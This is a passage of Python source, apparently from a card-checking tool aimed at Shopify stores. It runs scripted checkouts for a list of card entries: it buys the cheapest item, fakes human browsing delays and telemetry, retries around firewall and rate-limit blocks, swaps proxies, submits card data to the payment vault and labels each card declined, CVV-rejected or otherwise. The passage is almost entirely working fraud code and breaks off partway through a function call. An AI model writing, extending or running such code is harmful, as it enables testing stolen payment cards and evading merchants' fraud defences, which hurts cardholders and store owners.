            origin = ep.rsplit("/sessions", 1)[0]
            hdrs = {
                "accept":               "application/json",
                "accept-language":      "en-US,en;q=0.9",
                "content-type":         "application/json",
                "origin":               origin,
                "priority":             "u=1, i",
                "referer":              f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
                "sec-fetch-dest":       "empty",
                "sec-fetch-mode":       "cors",
                "sec-fetch-site":       "same-origin",
                "sec-fetch-storage-access": "active",
                "shopify-identification-signature": ident_sig,
            }
            for attempt in range(2):
                t0 = _time.monotonic()
                resp = await session.post(ep, data=payload, headers=hdrs, timeout=12)
                last_status, last_body = resp.status_code, resp.text
                if logger is not None:
                    pci_cookies = {}
                    try:
                        jar = session.cookies
                        pci_cookies = {k: str(jar.get(k)) for k in jar}
                    except Exception:
                        pass
                    logger.record("POST", ep, hdrs, payload, resp,
                                  (_time.monotonic() - t0) * 1000, pci_cookies)
                if 200 <= last_status < 300:
                    _VAULT_CACHE[scope] = ep
                    return last_status, last_body
                # WAF / gateway / empty -> try the next endpoint
                if last_status in (403, 406, 429, 500, 502, 503):
                    break
                await asyncio.sleep(0.5 * (attempt + 1) + random.uniform(0, 0.2))

        # proxy path failed -> retry the first endpoint direct (no-proxy)
        if not (200 <= last_status < 300) and proxy_url:
            session.proxies = {}
            for ep in candidates[:1]:
                origin = ep.rsplit("/sessions", 1)[0]
                hdrs = {
                    "accept":               "application/json",
                    "accept-language":      "en-US,en;q=0.9",
                    "content-type":         "application/json",
                    "origin":               origin,
                    "priority":             "u=1, i",
                    "referer":              f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
                    "sec-fetch-dest":       "empty",
                    "sec-fetch-mode":       "cors",
                    "sec-fetch-site":       "same-origin",
                    "sec-fetch-storage-access": "active",
                    "shopify-identification-signature": ident_sig,
                }
                for attempt in range(2):
                    resp = await session.post(ep, data=payload, headers=hdrs, timeout=12)
                    last_status, last_body = resp.status_code, resp.text
                    if 200 <= last_status < 300:
                        _VAULT_CACHE[scope] = ep
                        return last_status, last_body
                    await asyncio.sleep(0.6 * (attempt + 1))
    return last_status, last_body


async def _post_persisted_retry(client, url, gql_payload, headers):
    """POST a persisted GraphQL query, retrying transient 429/403/5xx.

    Mirrors main(6).py's _send_proposal ladder: clean -> 429/403/500 (retry)
    -> real response. Recovers the transient soft-blocks that would otherwise
    surface as a site error."""
    last_status, last_body = 0, ""
    for attempt in range(3):
        resp = await client.post(url, data=gql_payload, headers=headers)
        last_status, last_body = resp.status_code, resp.text
        if last_status in (429, 403) or last_status >= 500:
            await asyncio.sleep(random.uniform(0.8, 1.4) * (attempt + 1))
            continue
        return last_status, last_body
    return last_status, last_body


# ── Step 4: Proposal 1 ────────────────────────────────────────────────

async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                        checkout_token: str, session_token: str, stable_id: str,
                        variant_id: str, price: str, proposal_id: str,
                        build_id: str, source_token: str, currency: str, country: str):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    return await _post_persisted_retry(
        client, f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        gql_payload,
        _proposal_headers(shop_url, checkout_url, checkout_token,
                          session_token, build_id, source_token))


# ── Step 5: Proposal 2 (email) ────────────────────────────────────────

async def send_proposal2(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                         checkout_token: str, session_token: str, stable_id: str,
                         variant_id: str, price: str, proposal_id: str,
                         build_id: str, source_token: str, queue_token: str,
                         email: str, currency: str, country: str):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    return await _post_persisted_retry(
        client, f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        gql_payload,
        _proposal_headers(shop_url, checkout_url, checkout_token,
                          session_token, build_id, source_token))


# ── Step 6/7/8: Proposal 3 (address) ─────────────────────────────────

async def send_proposal3(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                         checkout_token: str, session_token: str, stable_id: str,
                         variant_id: str, price: str, proposal_id: str,
                         build_id: str, source_token: str, queue_token: str,
                         email: str, addr: Address, currency: str, country: str):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    return await _post_persisted_retry(
        client, f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        gql_payload,
        _proposal_headers(shop_url, checkout_url, checkout_token,
                          session_token, build_id, source_token))


# ── Step 10a: poll for receipt ────────────────────────────────────────

async def send_poll_for_receipt(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                                checkout_token: str, session_token: str, build_id: str,
                                source_token: str, poll_id: str, receipt_id: str,
                                receipt_session_token: str):
    params   = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id,
                                     "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers  = _proposal_headers(shop_url, checkout_url, checkout_token,
                                 session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    resp = await client.get(full_url, headers=headers)
    return resp.status_code, resp.text


# ── Step 10b: submit for completion ──────────────────────────────────

async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
                                     checkout_url: str, checkout_token: str,
                                     session_token: str, stable_id: str, variant_id: str,
                                     price: str, submit_id: str, build_id: str,
                                     source_token: str, queue_token: str, email: str,
                                     addr: Address, delivery_handle: str, shipping_amount: str,
                                     total_amount: str, pci_session_id: str, attempt_token: str,
                                     currency: str, country: str, signed_handles,
                                     is_digital: bool = False, tax_amount: str = None,
                                     total_any: bool = False,
                                     payment_flexibility_terms_id: str = "") -> tuple:
    handle_lines        = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id             = generate_page_id()

    flex_line = ""
    if payment_flexibility_terms_id:
        flex_line = (',\n        "paymentFlexibilityTermsId": "'
                     + payment_flexibility_terms_id + '"')

    if is_digital or total_any:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital or total_any:
        amount_line = '"amount": {"any": true}'
    else:
        amount_line = f'"amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          {amount_line}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}{flex_line}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    return await _post_persisted_retry(
        client, f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        gql_payload,
        _proposal_headers(shop_url, checkout_url, checkout_token,
                          session_token, build_id, source_token))


# ── Main async checkout orchestrator ─────────────────────────────────


# ──────────────────────── v2: human warmup + telemetry ─────────────────

_SHOP_ID_RE = re.compile(r'"(?:shop_id|shopId)"\s*:\s*(\d{4,})')
_SESSION_TOKEN_RE = re.compile(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"')


def _extract_shop_id_v2(html_text: str) -> int:
    m = _SHOP_ID_RE.search(html_text)
    return int(m.group(1)) if m else 0


def _extract_session_token_v2(html_text: str) -> str:
    m = _SESSION_TOKEN_RE.search(html.unescape(html_text))
    return html.unescape(m.group(1)).strip('"') if m else ""


async def human_warmup_async(client, shop_url: str, variant_id: str,
                             product_id: str, product_handle: str, tracker):
    """Landing -> browse -> POST /cart/add.js -> POST /cart -> checkout,
    with human delays and telemetry, mirroring hatch_session.har."""
    shop_url = shop_url.rstrip("/")
    landing_start = int(_time.time() * 1000)

    # 1) storefront landing — warm the session, let cookies drop
    landing = await client.get(shop_url + "/", timeout=20)
    tracker.set_shop(_extract_shop_id_v2(landing.text))
    await tracker.storefront_landing()

    # 2) human reading delay before adding to cart (2-4s)
    await asyncio.sleep(random.uniform(2.0, 4.0))

    # 3) browse the product page
    if product_handle:
        try:
            await client.get(f"{shop_url}/products/{product_handle}.js", timeout=15)
        except Exception:
            pass

    # 4) cart add — real storefront form (not the permalink shortcut)
    form = ("form_type=product&utf8=%E2%9C%93&id=" + str(variant_id)
            + (f"&product-id={product_id}" if product_id else "") + "&quantity=1")
    await client.post(f"{shop_url}/cart/add.js", data=form, headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": shop_url,
        "Referer": shop_url + (f"/products/{product_handle}" if product_handle else "/"),
    }, timeout=15)

    # 5) cart state
    await client.get(f"{shop_url}/cart.js", timeout=15)

    # 6) human reading delay before checkout (3-5s)
    await asyncio.sleep(random.uniform(3.0, 5.0))

    # 7) site abandonment telemetry (human leaves the storefront)
    await tracker.site_abandonment("index", landing_start,
                                   int(_time.time() * 1000) - landing_start)

    # 8) checkout init — POST /cart (302) then land on /checkouts/cn/<token>
    checkout_resp = await client.post(f"{shop_url}/cart", data={"checkout": ""},
                                      allow_redirects=True, timeout=20)
    checkout_url  = str(checkout_resp.url)
    checkout_html = checkout_resp.text
    m = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
    checkout_token = m.group(1) if m else ""
    session_token  = _extract_session_token_v2(checkout_html)

    tracker.set_checkout(checkout_token, session_token)
    await tracker.cart_added()
    await tracker.checkout_loaded()

    return checkout_url, checkout_token, session_token, checkout_html


async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                                      proxy_url: str = "") -> CheckResult:
    currency  = "USD"
    country   = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")

    result = CheckResult(card=card_entry, shop_url=shop_url,
                         site_name=site_name, currency=currency,
                         status=CheckStatus.ERROR)
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    email       = generate_random_email()

    raw_client = AsyncTLSClient(timeout=12, proxy_url=proxy_url)
    logger = RunLogger(card_entry, shop_url, proxy_url, raw_client)
    client = LoggedClient(raw_client, logger)
    tracker = Tracker(client, shop_url)
    try:
        currency, country = await fetch_shop_currency(client, shop_url)
        result.currency = currency
        # Step 0 - Find cheapest product (0.01$ to 20$): all pages in parallel
        try:
            title, product_id, product_handle, variant_id, price = await find_cheapest_product(
                client, shop_url, logger=logger
            )
            _ = title
            tracker.set_item(variant_id, product_id, price)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        # Step 1
        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                await human_warmup_async(client, shop_url, variant_id, product_id, product_handle, tracker)
            stable_id    = extract_stable_id(checkout_html)
            build_id     = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = "CF_MANAGED_CHALLENGE" not in str(e)
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        # Step 2
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            await fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        # Step 3
        try:
            ops = await discover_persisted_ids(client, checkout_html, shop_url, build_id)
            proposal_id         = ops.get("Proposal", "")
            submit_id           = ops.get("SubmitForCompletion", "")
            poll_for_receipt_id = ops.get("PollForReceipt", "")
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        # Step 4
        try:
            _, proposal_body = await send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country)
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            if not result.gateway:
                result.gateway = extract_gateway_name(proposal_body)
            if currency == "USD":
                sp = extract_seller_merchandise_price(proposal_body)
                if sp and sp != price:
                    price = sp
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        # Step 5
        try:
            _, proposal2_body = await send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        # Step 6
        try:
            addr = address_for_country(country)
            _, proposal3_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
            await tracker.address_completed()
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        # Step 7
        try:
            _, proposal4_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result

        # Step 8
        try:
            proposal5_status, proposal5_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result

        # Step 9
        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("could not extract identification signature")
            _vault_url = extract_vault_url(checkout_html)
            _vault_domain = extract_vault_domain(checkout_html)
            pci_status, pci_body = await send_pci_session(
                ident_sig, card_number,
                f"{addr.first_name} {addr.last_name}",
                card_month, card_year, card_cvv, site_name, proxy_url,
                impersonate=client.impersonate, logger=logger,
                vault_url=_vault_url, vault_domain=_vault_domain)

            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                verdict = classify_pci_rejection(pci_status, pci_body)
                if verdict == "invalid_cvc":
                    result.retryable = False
                    result.status = CheckStatus.DECLINED
                    result.error = Exception(
                        f"CVV rejected for this card type (HTTP {pci_status}): "
                        f"{_pci_error_reason(pci_body)}")
                    return result
                if verdict == "card_declined":
                    result.retryable = False
                    result.status = CheckStatus.DECLINED
                    result.error = Exception(
                        f"Card refused at tokenisation (HTTP {pci_status}): "
                        f"{_pci_error_reason(pci_body)}")
                    return result
                if verdict == "pci_error":
                    result.retryable = False
                    result.status = CheckStatus.ERROR
                    result.error = Exception(
                        f"PCI tokenisation refused the card data (HTTP {pci_status}): "
                        f"{_pci_error_reason(pci_body)}")
                    return result
                result.retryable = True
                raise Exception(
                    f"could not extract session ID (HTTP {pci_status}): "
                    f"{_pci_error_reason(pci_body)}")
            await tracker.card_entered()
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        # Step 10
        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            is_digital      = not extract_is_shipping_required(proposal5_body)
            delivery_handle, shipping_amount, needs_delivery = resolve_delivery(proposal5_body)
            if not delivery_handle and needs_delivery:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract delivery handle")
            if not shipping_amount:
                shipping_amount = "0.00"

            signed_handles = extract_signed_handles(proposal5_body)

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("Step 10 failed: could not extract total amount")
            result.amount = total_amount

            flex_terms_id = extract_payment_flexibility_terms_id(proposal5_body)
            attempt_token = generate_attempt_token(checkout_token)
            current_tax   = extract_tax_amount(proposal5_body)
            current_total = total_amount
            cover_any     = False

            for tax_attempt in range(1, 6):
                submit_status, submit_body = await send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
                    queue_token5, email, addr, delivery_handle, shipping_amount,
                    current_total, pci_session_id, attempt_token, currency, country,
                    signed_handles, is_digital=is_digital, tax_amount=current_tax,
                    total_any=cover_any,
